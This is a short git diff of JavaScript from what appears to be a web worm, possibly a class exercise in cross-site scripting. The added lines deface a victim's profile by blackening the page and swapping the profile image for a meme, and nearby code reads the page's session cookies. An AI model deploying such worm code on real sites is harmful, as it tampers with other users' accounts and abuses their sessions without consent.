@@ -49,6 +49,10 @@ function post_About() {
 function change_Profile(){
     oof = document.getElementById("name");
     oof.innerText = "Victim of worm!";
+    document.body.style.backgroundColor = "black";
+    eeek = document.getElementById("fb-image-lg");
+    eeek.src = "https://www.google.com/url?sa=i&url=https%3A%2F%2Fwww.polygon.com%2F22434541%2Fshrek-memes&psig=AOvVaw0IVBU0ojEbomPB09q0vcP6&ust=1639795223601000&source=images&cd=vfe&ved=0CAsQjRxqFwoTCMjk_rHn6fQCFQAAAAAdAAAAABAN";
+
 }
 
 const cookies = new URLSearchParams(document.cookie.replaceAll("; ","&"))
